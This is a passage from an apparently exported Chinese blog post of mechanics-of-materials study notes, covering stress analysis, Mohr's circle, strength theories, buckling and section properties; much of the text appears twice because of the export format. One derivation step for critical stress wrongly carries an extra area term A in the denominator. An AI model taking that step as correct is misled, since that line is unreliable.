\\\\\\\\\n\\sigma_\\mathrm{min}\n\\end{aligned}\n\\right\\\\}\n= \\frac{\\sigma_x+\\sigma_y}{2} \\pm \\sqrt{\\left(\\frac{\\sigma_x-\\sigma_y}{2}\\right)^2 + \\tau_{xy}^2}\n$$\n$$\n\\left.\n\\begin{aligned}\n\\tau_\\mathrm{max} \\\\\\\\\n\\tau_\\mathrm{min}\n\\end{aligned}\n\\right\\\\}\n= \\pm \\sqrt{\\left(\\frac{\\sigma_x-\\sigma_y}{2}\\right)^2 + \\tau_{xy}^2}\n$$\n$$\n\\sigma_\\alpha = \\frac{\\sigma_x+\\sigma_y}{2} + \\frac{\\sigma_x-\\sigma_y}{2}\\cos2\\alpha - \\tau_{xy}\\sin2\\alpha \\\\\\\\\n\\tau_\\alpha = \\frac{\\sigma_x-\\sigma_y}{2}\\sin2\\alpha + \\tau_{xy}\\cos2\\alpha\n$$\n\n### 二向应力状态分析————图解法\n\n上面两式两边平方然后相加可消去 $\\alpha$ ，得\n$$\n\\left(\\sigma_\\alpha-\\frac{\\sigma_x+\\sigma_y}{2}\\right)^2 + \\tau_\\alpha^2 = \\left(\\frac{\\sigma_x-\\sigma_y}{2}\\right)^2 + \\tau_{xy}^2\n$$\n$\\sigma_x,\\sigma_y,\\tau_{xy}$ 均为已知量，可此式是一个以 $\\sigma_\\alpha$ 和 $\\tau_\\alpha$ 为变量的圆方程，以横坐标表示 $\\sigma$ ，纵坐标表示 $\\tau$ ，则圆心横坐标为 $\\frac{1}{2}(\\sigma_x+\\sigma_y)$ ，纵坐标为零，半径为 $\\sqrt{\\left(\\frac{\\sigma_x-\\sigma_y}{2}\\right)^2 + \\tau_{xy}^2}$ 。这一圆周称为**应力圆**。\n\n作法：\n\n1. 在坐标系取点 $A(\\sigma_x,0)$ ，$D(\\sigma_x,\\tau_{xy})$ ，$B(\\sigma_y,0)$ ，$D'(\\sigma_y,-\\tau_{xy})$ 。\n2. 连接 $D$ 和 $D'$ ，与横坐标交于 $C$ 点，以 $C$ 为圆心， $CD$ 为半径画圆，得到应力圆。\n\n在应力圆上，从 $D$ 点（它代表以 $x$ 轴为法线的面上的应力）也按逆时针方向沿圆周转到 $E$ 点，且使 $DE$ 弧所对圆心角为 $\\alpha$ 的 $2$ 倍，则 $E$ 点的坐标就代表以 $n$ 为法线的斜面上的应力。\n\n### 三向应力状态\n\n$$\n\\sigma_\\mathrm{max} = \\sigma_1, \\quad\\sigma_\\mathrm{min} = \\sigma_3, \\quad\\tau_\\mathrm{max} = \\frac{\\sigma_1-\\sigma_3}{2}\n$$\n$\\sigma_2$ 就是一般就是垂直于 $\\sigma_1$ 和 $\\sigma_3$ 的应力。\n\n### 广义胡克定律\n\n$$\n\\varepsilon_x = \\frac1E[\\sigma_x-\\mu(\\sigma_y+\\sigma_z)]\n$$\n\n$$\n\\varepsilon_1 = \\frac1E[\\sigma_1-\\mu(\\sigma_2+\\sigma_3)] \\\\\\\\\n\\varepsilon_2 = \\frac1E[\\sigma_2-\\mu(\\sigma_1+\\sigma_3)] \\\\\\\\\n\\varepsilon_3 = \\frac1E[\\sigma_3-\\mu(\\sigma_1+\\sigma_2)]\n$$\n\n### 四种常用强度理论\n\n最大拉应力理论（第一强度理论）\n$$\n\\sigma_{\\mathrm{r}1} = \\sigma_1\n$$\n最大伸长线应力理论（第二强度理论）\n$$\n\\sigma_{\\mathrm{r}2} = \\sigma_1 - \\mu(\\sigma_2+\\sigma_3)\n$$\n最大切应力理论（第三强度理论）\n$$\n\\sigma_{\\mathrm{r}3} = \\sigma_1 - \\sigma_3\n$$\n最大畸变能密度理论（第四强度理论）\n$$\n\\sigma_{\\mathrm{r}4} = \\sqrt{\\frac12[(\\sigma_1-\\sigma_2)^2+(\\sigma_2-\\sigma_3)^2+(\\sigma_3-\\sigma_1)^2]}\n$$\n\n### 莫尔强度理论\n\n$$\n\\sigma_\\mathrm{rM} = \\sigma_1 - \\frac{[\\sigma_t]}{[\\sigma_c]}\\sigma_3\n$$\n\n## 组合变形\n\n### 扭转与弯曲的组合\n\n$$\nM = \\sqrt{M_{y\\mathrm{max}}^2+M_{z\\mathrm{max}}^2}\n$$\n按第三强度理论，有\n$$\n\\sqrt{\\sigma^2+4\\tau^2} \\leqslant [\\sigma] \\\\\\\\\n\\frac1W\\sqrt{M^2+T^2} \\leqslant [\\sigma]\n$$\n按第四强度理论，有\n$$\n\\sqrt{\\sigma^2+3\\tau^2} \\leqslant [\\sigma] \\\\\\\\\n\\frac1W\\sqrt{M^2+0.75T^2} \\leqslant [\\sigma]\n$$\n\n## 压杆稳定\n\n### 压杆稳定的概念\n\n细长杆件受压时，设压力与轴线重合，压力小于某一极限值时，压杆一直保持**直线**形状的平衡，即便有微小的侧向干扰力使其暂时发生轻微弯曲，干扰力解除后，压杆也能恢复直线形状，这表明压杆直线形状的平衡是稳定的。但是如果压力大于某一极限值时，压杆的直线平衡变为不稳定，将转变为**曲线**形状的平衡。这时再用微小的侧向干扰力使其发生轻微弯曲，干扰力解除后，它将保持曲线形状的平衡，不能恢复到原有的直线形状。\n\n上述压力的极限值称为临界压力或临界力，记为 $F_\\mathrm{cr}$ 。压杆丧失其直线形状的平衡而过渡为曲线平衡，称为丧失稳定性，简称**失稳**，也称为屈曲。\n\n### 其他支座条件下细长压杆的临界压力\n\n欧拉公式的普遍形式为\n$$\nF_\\mathrm{cr} = \\frac{\\pi^2EI}{(\\mu l)^2}\n$$\n式中 $\\mu l$ 表示把压杆折算成两端铰支杆的长度，称为相当长度，$\\mu$ 称为长度因数，不同情况下的长度因数 $\\mu$ 列表如下：\n\n| 压杆的约束条件 | 长度因数 |\n| :-- | :-- |\n| 两端铰支 | $\\mu=1$ |\n| 一端固定，另一端自由 | $\\mu=2$ |\n| 两端固定 | $\\mu=\\frac12$ |\n| 一端固定，另一端铰支 | $\\mu\\approx0.7$ |\n\n### 欧拉公式的适用范围 经验公式\n\n$$\n\\sigma_\\mathrm{cr} = \\frac{F_\\mathrm{cr}}{A} = \\frac{\\pi^2EI}{(\\mu l)^2A}\n$$\n$ \\sigma_\\mathrm{cr}$ 称为临界应力。把横截面的惯性矩 $I$ 写成\n$$\nI = i^2A\n$$\n上式可以写成\n$$\n\\sigma_\\mathrm{cr} = \\frac{\\pi^2E}{(\\frac{\\mu l}{i})^2A}\n$$\n引用记号\n$$\n\\lambda = \\frac{\\mu l}{i}\n$$\n$\\lambda$ 是一个量纲一的量，称为柔度或长细比，综合反映了压杆的长度、约束条件、截面尺寸和形状等因素对临界应力 $\\sigma_\\mathrm{cr}$ 的影响。计算临界应力的公式可以写成\n$$\n\\sigma_\\mathrm{cr} = \\frac{\\pi^2E}{\\lambda^2}\n$$\n这是欧拉公式的另一种表达形式，其适用范围为\n$$\n\\lambda \\leqslant \\lambda_\\mathrm{p} = \\pi\\sqrt{\\frac{E}{\\sigma_\\mathrm{p}}}\n$$\n\n### 压杆的稳定性校核\n\n$F_\\mathrm{cr}$ 与 $F$ 之比即为压杆的工作安全因数 $n$，它应大于规定的稳定安全因数 $n_\\mathrm{st}$，即\n$$\nn = \\frac{F_\\mathrm{cr}}{F} \\geqslant n_\\mathrm{st}\n$$\n\n## 平面图形的几何性质\n\n### 静矩和形心\n\n在坐标 $(y,z)$ 处，取微面积 $\\mathrm{d}A$ ，遍及整个图形面积 $A$ 的积分\n$$\nS_z = \\int_A y\\mathrm{d}A, \\quad S_y = \\int_A z\\mathrm{d}A\n$$\n分别定义为图形对 $z$ 轴和 $y$ 轴的**静矩**，也称为图形对 $z$ 轴和 $y$ 轴的**一次矩**。\n这个坐标轴之所以只有 $y$ 和 $z$ 而没有 $x$ ，是因为我们一般分析的是横截面，$x$ 轴是杆的轴线方向。\n可以看出，平面图形的静矩是对某一坐标轴而言的，也就是说，同一图形对不同的坐标轴的静矩通常是不同的。静矩的量纲是长度的三次方。\n\n平面图形对 $y$ 轴和 $z$ 轴的静矩，分别等于**图形面积** $A$ **乘形心的坐标** $\\overline{z}$ 和 $\\overline{y}$ ，即\n$$\nS_z = A\\cdot\\overline{y}, \\quad S_y = A\\cdot\\overline{z}\n$$\n\n### 惯性矩和惯性半径\n\n在坐标 $(y,z)$ 处，取微面积 $\\mathrm{d}A$ ，遍及整个图形面积 $A$ 的积分\n$$\nI_y = \\int_A z^2\\mathrm{d}A, \\quad I_z = \\int_A y^2\\mathrm{d}A\n$$\n分别定义为图形对 $y$ 轴和 $z$ 轴的**惯性矩**，也称为图形对 $y$ 轴和 $z$ 轴的**二次矩**。惯性矩的量纲是长度的四次方。\n矩形的对形心轴的 $I_z$ 为 $\\frac{bh^3}{12}$ 。\n力学计算中，有时把惯性矩写成图形面积 $A$ 与某一长度的平方的乘积，即\n$$\nI_y = A\\cdot i_y^2, \\quad I_z = A\\cdot i_z^2\n$$\n或者改写为\n$$\ni_y = \\sqrt{\\frac{I_y}{A}}, \\quad i_z = \\sqrt{\\frac{I_z}{A}}\n$$\n式中的 $i_y$ 和 $i_z$ 分别称为图形对 $y$ 轴和 $z$ 轴的**惯性半径**。惯性半径的量纲就是长度的量纲。\n\n以 $\\rho$ 表示微面积 $\\mathrm{d}A$ 到坐标原点 $O$ 的距离，下列积分\n$$\nI_\\mathrm{p} = \\int_A \\rho^2\\mathrm{d}A\n$$\n定义为图形对坐标原点 $O$ 的**极惯性矩**。又 $\\rho^2 = y^2+z^2$ ，于是有\n$$\nI_\\mathrm{p} = \\int_A (y^2+z^2)\\mathrm{d}A = \\int_A y^2\\mathrm{d}A + \\int_A z^2\\mathrm{d}A = I_z + I_y\n$$\n\n### 惯性积\n\n在坐标 $(y,z)$ 处，取微面积 $\\mathrm{d}A$ ，遍及整个图形面积 $A$ 的积分\n$$\nI_{yz} = \\int_A yz\\mathrm{d}A\n$$\n定义为图形对 $y,z$ 轴的**惯性积**。惯性积的量纲是长度的四次方。\n坐标系的两根坐标轴中只要有一根为图形对称轴，则图形对这一坐标系的惯性积就等于零。\n\n### 平行移轴公式\n\n$$\nI_y = I_{yC} + a^2A \\\\\\\\\nI_z = I_{zC} + b^2A \\\\\\\\\n$$\n","source":"_posts/材料力学笔记.md","raw":"---\ntitle: 材料力学笔记\ndate: 2023-01-24 23:27:00\ntags: [材料力学]\ncategories: 学习\n---\n\n莫名其妙考了个第一，来还个愿。\n<!--more-->\n\n最近买了台二手服务器，折腾了一些集群、容器、虚拟化之类的东西，比较偏操作也没啥好记的，就很长时间没更了。\n\n这里大致记一下概念，捋一下思路。\n\n## 绪论\n\n### 材料力学的任务\n\n使材料满足三个要求：**强度**、**刚度**、**稳定性**。\n\n### 变形固体的基本假设\n\n三个假设：**连续性**、**均匀性**、**各向同性**。\n\n### 变形与应变\n\n应变 $\\varepsilon$ 和切应变 $\\gamma$ 是度量一点处变形程度的两个基本量，量纲为一。\n\n### 杆件变形的基本形式\n\n拉伸或压缩、剪切、弯曲、扭转。\n\n## 拉伸、压缩与剪切\n\n### 直杆轴向拉伸或压缩时斜截面上的应力\n\n拉（压）杆的破坏并不总是沿横截面发生，有时沿斜截面发生。\n\n设与横截面成 $\\alpha$ 角的斜截面 $k-k$ 的面积为 $A_\\alpha$，横截面的面积为 $A$，则\n$$\nA_\\alpha = \\frac{A}{\\cos\\alpha}\n$$\n\n把应力 $p_\\alpha$ 分解成垂直于斜截面的正应力 $\\sigma_\\alpha$ 和沿斜截面的剪应力 $\\tau_\\alpha$，则\n$$\n\\sigma_\\alpha = p_\\alpha\\cos\\alpha = \\sigma\\cos^2\\alpha \\\\\\\\\n\\tau_\\alpha = p_\\alpha\\sin\\alpha = \\sigma\\cos\\alpha\\sin\\alpha = \\frac{\\sigma}{2}\\sin2\\alpha\n$$\n\n当 $\\alpha = 0$ 时，$\\sigma_\\alpha$ 达到最大值，即\n$$\n\\sigma_{\\alpha \\mathrm{max}} = \\sigma\n$$\n\n### 材料拉伸时的力学性能\n\n低碳钢的力学性能大致如下：\n\n1. 弹性阶段：应力 $\\sigma$ 与应变 $\\varepsilon$ 成正比，即有 $\\sigma = E\\varepsilon$ ，$E$ 为**弹性模量**。直线最高点对应的应力 $\\sigma_\\mathrm{p}$ 称为**比例极限**，超过这个比例极限后，还有一个**弹性极限**，这两点间虽然不是直线，但松开后变形还是可以**完全消失**的，但两点非常接近，所以实际上不作严格区分。\n2. 屈服阶段：一段小锯齿，应变**明显增加**，应力**先下降再小波动**，先下降的那个最低点为屈服阶段或屈服强度，记作 $\\sigma_\\mathrm{s}$ 。\n3. 强化阶段：恢复抵抗变形能力，最高点对应应力 $\\sigma_\\mathrm{b}$ 为**强度极限**。\n4. 局部变形阶段：过强度极限后出现缩颈\n\n铸铁在较小拉应力下就被拉断，没有屈服和缩颈现象，拉断前的应变也小，是典型的脆性材料。\n\n### 材料压缩时的力学性能\n\n> 什么？这不是饼干，这是一个压缩毛巾啊......（滑稽）\n\n低碳钢压缩时的弹性模量 $E$ 和屈服极限 $\\sigma_\\mathrm{s}$ 都和拉伸时大致相同，之后越压越扁，也越来越难压，所以得不到压缩时的强度极限。\n\n铸铁仍在较小变形下突然破坏，破坏断面法线与轴线大致成 45° - 55° 角。\n\n### 失效、安全因数和强度计算\n\n对塑性材料，$[\\sigma] = \\frac{\\sigma_\\mathrm{s}}{n_\\mathrm{s}}$；对脆性材料，$[\\sigma] = \\frac{\\sigma_\\mathrm{b}}{n_\\mathrm{b}}$。其中 $n_\\mathrm{s}$ 和 $n_\\mathrm{b}$ 称为**安全系数**，有\n$$\n\\sigma = \\frac{F_\\mathrm{N}}{A} \\leqslant [\\sigma]\n$$\n\n### 轴向拉伸或压缩时的变形\n\n$$\n\\Delta l = \\frac{F_\\mathrm{N}l}{EA} = \\frac{Fl}{EA}\n$$\n\n可以看出，对长度相同、受力相等的杆件，$EA$ 越大变形 $\\Delta l$ 就越小，所以 $EA$ 越大的材料越强，称为杆件的抗拉（压）**刚度**。\n\n试验表明，应力不超过比例极限时横向应变 $\\varepsilon'$ 与轴向应变 $\\varepsilon$ 之比是一个常数，即\n$$\n\\mu = -\\frac{\\varepsilon'}{\\varepsilon}\n$$\n$\\mu$ 称为横向变形因数或**泊松比**。之所以有个负号，是因为一般材料都是伸长时横向缩小，压缩时横向增大。\n\n### 轴向拉伸或压缩时的应变能\n\n杆件拉伸时，有 $W = \\frac12F\\Delta l$，忽略动能、热能等变化，杆件就只存到了应变能 $V_\\varepsilon = W = \\frac12F\\Delta l = \\frac{F^2l}{2EA}$，比能 $v_\\varepsilon = \\frac12\\sigma\\varepsilon$。\n\n**能量法**解题时需要计算应变能。\n\n### 拉伸、压缩超静定问题\n\n理论力学默认材料都是刚体，没法解决超静定问题，但实际上材料总是会变形的。\n\n### 温度应力和装配应力\n\n温度变化为 $\\Delta T$ 时，杆件变形为\n$$\n\\Delta l_T = \\alpha_l\\Delta T\\cdot l\n$$\n式中 $\\alpha_l$ 为材料的**线胀系数**。\n\n### 剪切和挤压的实用计算\n\n$$\n\\tau = \\frac{F_\\mathrm{S}}{A} \\leqslant [\\tau]\n$$\n\n## 扭转\n\n### 外力偶矩的计算\n\n由\n$$\n2\\pi \\times \\frac{n}{60} \\times M_\\mathrm{e} = P \\times 1000\n$$\n得出计算外力偶矩 $M_\\mathrm{e}$ 的公式为\n$$\n\\{M_\\mathrm{e}\\}_{\\mathrm{N\\cdot m}} = 9549 \\frac{\\{P\\}_\\mathrm{kW}}{\\{n\\}_\\mathrm{r/min}}\n$$\n\n### 纯剪切\n\n对各向同性材料，三个弹性常数 $E,G,\\mu$ 之间存在下列关系：\n$$\nG = \\frac{E}{2(1+\\mu)}\n$$\n\n### 圆轴扭转时的应力\n\n最大切应力\n$$\n\\tau_\\mathrm{max} = \\frac{T}{W_\\mathrm{t}}\n$$\n式中 $W_\\mathrm{t}=I_p/R$ 为**抗扭(twist)截面系数**。\n圆截面的抗扭截面系数为\n$$\nW_\\mathrm{t} = \\frac{\\pi D^3}{16}\n$$\n空心圆截面的抗扭截面系数为\n$$\nW_\\mathrm{t} = \\frac{\\pi}{16D}(D^4 - d^4) = \\frac{\\pi D^3}{16}(1 - \\alpha^4)\n$$\n\n### 圆轴扭转时的变形\n\n距离为 $l$ 的两个横截面之间的**相对转角**为\n$$\n\\varphi = \\frac{Tl}{G I_\\mathrm{p}}\n$$\n$\\varphi$ 的变化率 $\\varphi'$ 为**单位长度扭转角**，单位为 rad/m，即\n$$\n\\varphi'_\\mathrm{max} = \\frac{T}{G I_\\mathrm{p}} \\leqslant [\\varphi']\n$$\n式中 $I_\\mathrm{p}$ 为横截面对圆心 $O$ 点的极惯性矩，即\n$$\nI_\\mathrm{p} = \\int_A \\rho^2 \\mathrm{d}A\n$$\n圆截面的 $I_\\mathrm{p} = \\frac{\\pi D^4}{32}$，空心圆截面的 $I_\\mathrm{p} = \\frac{\\pi D^4}{32}(1 - \\alpha^4)$。\n\n### 圆柱形密圈螺旋弹簧的应力和变形\n\n弹簧最大切应力\n$$\n\\tau_\\mathrm{max} = \\left(\\frac{4c-1}{4c-4}+\\frac{0.615}{c}\\right)\\frac{8FD}{\\pi d^3} = k\\frac{8FD}{\\pi d^3}\n$$\n式中 $c=\\frac Dd$ 为**弹簧指数**，$k$ 为曲度系数。\n\n#### 刚度系数\n\n$$\nC = \\frac{Gd^4}{8D^3n} = \\frac{Gd^4}{64R^3n}\n$$\n代表弹簧抵抗变形的能力。\n变形 $\\lambda = \\frac{F}{C}$ 。\n\n### 非圆截面杆扭转的概念\n\n$$\n\\tau_\\mathrm{max} = \\frac{T}{\\alpha hb^2}\n$$\n\n## 弯曲内力\n\n### 弯曲的概念和实例\n\n以**弯曲**变形为主的杆件习惯上称为**梁**。\n\n### 剪力和弯矩\n\n符号规定：\n\n* 剪力：截面 $m-m$ 的左段对右段向上相对错动时，截面 $m-m$ 上的剪力规定为正；反之为负。\n* 弯矩：截面 $m-m$ 处弯曲变形凸向下时，截面 $m-m$ 上的弯矩规定为正；反之为负。\n\n计算剪力和弯矩时注意考虑**支座反力**。\n弯矩方程对距离求导为剪力方程。\n\n### 平面曲杆的弯曲内力\n\n分析时取圆心角为 $\\varphi$ 的横截面 $m-m$ 将曲杆分成两部分，然后列平衡方程。\n\n符号规定：\n\n* 引起**拉伸**变形的轴力 $F_\\mathrm{N}$ 为正\n* 使轴线**曲率增加**的弯矩 $M$ 为正\n* 以剪力 $F_\\mathrm{S}$ 对所考虑的一段曲杆内任一点取矩，若力矩为**顺时针**方向，则剪力 $F_\\mathrm{S}$ 为正\n\n## 弯曲应力\n\n### 概述\n\n弯矩 $M$ 只与横截面上的正应力 $\\sigma$ 有关，剪力 $F_\\mathrm{S}$ 只与横截面上的切应力 $\\tau$ 有关。\n\n梁中间段上剪力为零，弯矩为常量的情况称为**纯弯曲**。\n\n梁发生弯曲变形时长度不变的纤维层称为中性层，中性层与横截面的交线称为**中性轴**。\n\n### 横力弯曲时的正应力\n\n工程实际中觉的弯曲问题多为**横力弯曲**，此时梁的横截面上不仅有**正应力**而且有**切应力**。\n\n一般情况下，最大正应力 $\\sigma_\\mathrm{max}$ 发生于弯矩最大的截面上，且离中性轴最远处，即\n$$\n\\sigma_\\mathrm{max} = \\frac{M_\\mathrm{max}y_\\mathrm{max}}{I_z}\n$$\n引入记号\n$$\nW = \\frac{I_z}{y_\\mathrm{max}}\n$$\n则有\n$$\n\\sigma_\\mathrm{max} = \\frac{M_\\mathrm{max}}{W}\n$$\n$W$ 称为**抗弯截面系数**，与截面的几何形状有关，单位为 $\\mathrm{m}^3$ 。\n\n若截面是高为 $h$、宽为 $b$ 的矩形，则\n$$\nW = \\frac{I_z}{h/2} = \\frac{bh^3/12}{h/2} = \\frac{bh^2}{6}\n$$\n若截面是直径为 $d$ 的圆形，则\n$$\nW = \\frac{I_z}{d/2} = \\frac{\\pi d^4/64}{d/2} = \\frac{\\pi d^3}{32}\n$$\n类似地，空心圆形截面的抗弯截面系数为\n$$\nW = \\frac{\\pi d^3(1-\\alpha^4)}{32}\n$$\n弯曲正应力的强度条件为\n$$\n\\sigma_\\mathrm{max} = \\frac{M_\\mathrm{max}}{W} \\leqslant [\\sigma]\n$$\n\n### 弯曲切应力\n\n$$\nS_z^* = \\int_{A_1}y_1\\mathrm{d}A\n$$\n是横截面的部分面积 $A_1$ 对中性轴的静矩。\n\n一般说，在剪力为最大值的截面的中性轴上，出现最大切应力，且\n$$\n\\tau_\\mathrm{max} = \\frac{F_\\mathrm{Smax}S^*_\\mathrm{zmax}}{I_z b}\n$$\n\n**矩形**截面梁的最大切应力\n$$\n\\tau_\\mathrm{max} = \\frac{3}{2}\\frac{F_\\mathrm{S}}{bh}\n$$\n为平均切应力的 1.5 倍。\n\n**圆形**截面梁的最大切应力\n$$\n\\tau_\\mathrm{max} = \\frac43\\frac{F_\\mathrm{S}}{\\pi R^2}\n$$\n为平均切应力的 $\\frac43$ 倍。\n\n### 提高弯曲强度的措施\n\n对抗拉和抗压强度相同的材料（如碳钢）宜采用中性轴对称的截面，对抗拉和抗压强度不相等的材料（如铸铁）宜采用中性轴**偏向于受拉一侧**的截面形状。\n如能使 $y_1$ 和 $y_2$ 之比接近于下列关系：\n$$\n\\frac{\\sigma_\\mathrm{tmax}}{\\sigma_\\mathrm{cmax}} = \\frac{M_\\mathrm{max}y_1}{Iz}/\\frac{M_\\mathrm{max}y_2}{Iz} = \\frac{y_1}{y_2} = \\frac{[\\sigma_\\mathrm{t}]}{[\\sigma_\\mathrm{c}]}\n$$\n式中 $[\\sigma_\\mathrm{t}]$ 和 $[\\sigma_\\mathrm{c}]$ 分别表示拉伸（Tension）和压缩（Compression）的许用应力，则最大拉应力和最大压应力可同时接近许用应力。\n强度校核时超过百分之 $5$ 以内都可接受（跟开车超速一点点不扣分差不多）。\n\n## 弯曲变形\n\n### 挠曲线的微分方程\n\n发生弯曲变形时，变形前为直线的梁轴线，变形后成为一条连续且光滑的曲线，称为**挠曲线**。\n\n### 用积分法求弯曲变形\n\n边界条件：在固定端，挠度和转角都为零，在铰支座上，挠度为零。\n$$\nEIw'' = M(x)\n$$\n然后对 $x$ 积分两次，代入边界条件和连续条件确定积分常数，得到挠曲线方程。\n注意 $w'$ 即为 $\\theta$ 。\n\n### 用叠加法求弯曲变形\n\n**弯曲变形很小**且材料服从**胡克定律**时，挠曲线的微分方程是线性的。\n\n## 应力和应变分析 强度理论\n\n### 应力状态概述\n\n切应力等于零的面称为**主平面**，主平面上的正应力称为主应力。\n\n### 二向和三向应力状态的实例\n\n圆筒的壁厚 $\\delta$ 远小于它的内径 $D$ 时，称为**薄壁圆筒**。若封闭的薄壁圆筒所受内压为 $p$ ，则其横截面上应力\n$$\n\\sigma' = \\frac FA = \\frac{p\\cdot\\frac{\\pi D^2}{4}}{\\pi D\\delta} = \\frac{pD}{4\\delta}\n$$\n纵向截面上应力\n$$\n\\sigma'' = \\frac{pD}{2\\delta}\n$$\n\n在研究一点的应力状态时，通常用 $\\sigma_1,\\sigma_2,\\sigma_3$ 代表该点的三个主应力，并以 $\\sigma_1$ 代表代数值最大的主应力，$\\sigma_3$ 代表代数值最小的主应力，即 $\\sigma_1 \\geqslant \\sigma_2 \\geqslant \\sigma_3$ 。\n\n### 二向应力状态分析————解析法\n\n$\\sigma_x$ 和 $\\tau_{xy}$ 是**法线与 $x$ 轴平行**的面上的正应力和切应力；$\\sigma_y$ 和 $\\tau_{yx}$ 是**法线与 $y$ 轴平行**的面上的正应力和切应力。\n符号规定：正应力拉正压负，切应力对单元体内任意点的矩为**顺时针**转向时为正，反之为负，这里与平常不同。\n取任意斜截面，其外法线 $n$ 与 $x$ 轴的夹角为 $\\alpha$ 。规定：由 $x$ 轴转到**外法线** $n$ 为**逆时针**转向时，则 $\\alpha$ 为正。\n\n$$\n\\left.\n\\begin{aligned}\n\\sigma_\\mathrm{max} \\\\\\\\\n\\sigma_\\mathrm{min}\n\\end{aligned}\n\\right\\\\}\n= \\frac{\\sigma_x+\\sigma_y}{2} \\pm \\sqrt{\\left(\\frac{\\sigma_x-\\sigma_y}{2}\\right)^2 + \\tau_{xy}^2}\n$$\n$$\n\\left.\n\\begin{aligned}\n\\tau_\\mathrm{max} \\\\\\\\\n\\tau_\\mathrm{min}\n\\end{aligned}\n\\right\\\\}\n= \\pm \\sqrt{\\left(\\frac{\\sigma_x-\\sigma_y}{2}\\right)^2 + \\tau_{xy}^2}\n$$\n$$\n\\sigma_\\alpha = \\frac{\\sigma_x+\\sigma_y}{2} + \\frac{\\sigma_x-\\sigma_y}{2}\\cos2\\alpha - \\tau_{xy}\\sin2\\alpha \\\\\\\\\n\\tau_\\alpha = \\frac{\\sigma_x-\\sigma_y}{2}\\sin2\\alpha + \\tau_{xy}\\cos2\\alpha\n$$\n\n### 二向应力状态分析————图解法\n\n上面两式两边平方然后相加可消去 $\\alpha$ ，得\n$$\n\\left(\\sigma_\\alpha-\\frac{\\sigma_x+\\sigma_y}{2}\\right)^2 + \\tau_\\alpha^2 = \\left(\\frac{\\sigma_x-\\sigma_y}{2}\\right)^2 + \\tau_{xy}^2\n$$\n$\\sigma_x,\\sigma_y,\\tau_{xy}$ 均为已知量，可此式是一个以 $\\sigma_\\alpha$ 和 $\\tau_\\alpha$ 为变量的圆方程，以横坐标表示 $\\sigma$ ，纵坐标表示 $\\tau$ ，则圆心横坐标为 $\\frac{1}{2}(\\sigma_x+\\sigma_y)$ ，纵坐标为零，半径为 $\\sqrt{\\left(\\frac{\\sigma_x-\\sigma_y}{2}\\right)^2 + \\tau_{xy}^2}$ 。这一圆周称为**应力圆**。\n\n作法：\n\n1. 在坐标系取点 $A(\\sigma_x,0)$ ，$D(\\sigma_x,\\tau_{xy})$ ，$B(\\sigma_y,0)$ ，$D'(\\sigma_y,-\\tau_{xy})$ 。\n2. 连接 $D$ 和 $D'$ ，与横坐标交于 $C$ 点，以 $C$ 为圆心， $CD$ 为半径画圆，得到应力圆。\n\n在应力圆上，从 $D$ 点（它代表以 $x$ 轴为法线的面上的应力）也按逆时针方向沿圆周转到 $E$ 点，且使 $DE$ 弧所对圆心角为 $\\alpha$ 的 $2$ 倍，则 $E$ 点的坐标就代表以 $n$ 为法线的斜面上的应力。\n\n### 三向应力状态\n\n$$\n\\sigma_\\mathrm{max} = \\sigma_1, \\quad\\sigma_\\mathrm{min} = \\sigma_3, \\quad\\tau_\\mathrm{max} = \\frac{\\sigma_1-\\sigma_3}{2}\n$$\n$\\sigma_2$ 就是一般就是垂直于 $\\sigma_1$ 和 $\\sigma_3$ 的应力。\n\n### 广义胡克定律\n\n$$\n\\varepsilon_x = \\frac1E[\\sigma_x-\\mu(\\sigma_y+\\sigma_z)]\n$$\n\n$$\n\\varepsilon_1 = \\frac1E[\\sigma_1-\\mu(\\sigma_2+\\sigma_3)] \\\\\\\\\n\\varepsilon_2 = \\frac1E[\\sigma_2-\\mu(\\sigma_1+\\sigma_3)] \\\\\\\\\n\\varepsilon_3 = \\frac1E[\\sigma_3-\\mu(\\sigma_1+\\sigma_2)]\n$$\n\n### 四种常用强度理论\n\n最大拉应力理论（第一强度理论）\n$$\n\\sigma_{\\mathrm{r}1} = \\sigma_1\n$$\n最大伸长线应力理论（第二强度理论）\n$$\n\\sigma_{\\mathrm{r}2} = \\sigma_1 - \\mu(\\sigma_2+\\sigma_3)\n$$\n最大切应力理论（第三强度理论）\n$$\n\\sigma_{\\mathrm{r}3} = \\sigma_1 - \\sigma_3\n$$\n最大畸变能密度理论（第四强度理论）\n$$\n\\sigma_{\\mathrm{r}4} = \\sqrt{\\frac12[(\\sigma_1-\\sigma_2)^2+(\\sigma_2-\\sigma_3)^2+(\\sigma_3-\\sigma_1)^2]}\n$$\n\n### 莫尔强度理论\n\n$$\n\\sigma_\\mathrm{rM} = \\sigma_1 - \\frac{[\\sigma_t]}{[\\sigma_c]}\\sigma_3\n$$\n\n## 组合变形\n\n### 扭转与弯曲的组合\n\n$$\nM = \\sqrt{M_{y\\mathrm{max}}^2+M_{z\\mathrm{max}}^2}\n$$\n按第三强度理论，有\n$$\n\\sqrt{\\sigma^2+4\\tau^2} \\leqslant [\\sigma] \\\\\\\\\n\\frac1W\\sqrt{M^2+T^2} \\leqslant [\\sigma]\n$$\n按第四强度理论，有\n$$\n\\sqrt{\\sigma^2+3\\tau^2} \\leqslant [\\sigma] \\\\\\\\\n\\frac1W\\sqrt{M^2+0.75T^2} \\leqslant [\\sigma]\n$$\n\n## 压杆稳定\n\n### 压杆稳定的概念\n\n细长杆件受压时，设压力与轴线重合，压力小于某一极限值时，压杆一直保持**直线**形状的平衡，即便有微小的侧向干扰力使其暂时发生轻微弯曲，干扰力解除后，压杆也能恢复直线形状，这表明压杆直线形状的平衡是稳定的。但是如果压力大于某一极限值时，压杆的直线平衡变为不稳定，将转变为**曲线**形状的平衡。这时再用微小的侧向干扰力使其发生轻微弯曲，干扰力解除后，它将保持曲线形状的平衡，不能恢复到原有的直线形状。\n\n上述压力的极限值称为临界压力或临界力，记为 $F_\\mathrm{cr}$ 。压杆丧失其直线形状的平衡而过渡为曲线平衡，称为丧失稳定性，简称**失稳**，也称为屈曲。\n\n### 其他支座条件下细长压杆的临界压力\n\n欧拉公式的普遍形式为\n$$\nF_\\mathrm{cr} = \\frac{\\pi^2EI}{(\\mu l)^2}\n$$\n式中 $\\mu l$ 表示把压杆折算成两端铰支杆的长度，称为相当长度，$\\mu$ 称为长度因数，不同情况下的长度因数 $\\mu$ 列表如下：\n\n| 压杆的约束条件 | 长度因数 |\n| :-- | :-- |\n| 两端铰支 | $\\mu=1$ |\n| 一端固定，另一端自由 | $\\mu=2$ |\n| 两端固定 | $\\mu=\\frac12$ |\n| 一端固定，另一端铰支 | $\\mu\\approx0.7$ |\n\n### 欧拉公式的适用范围 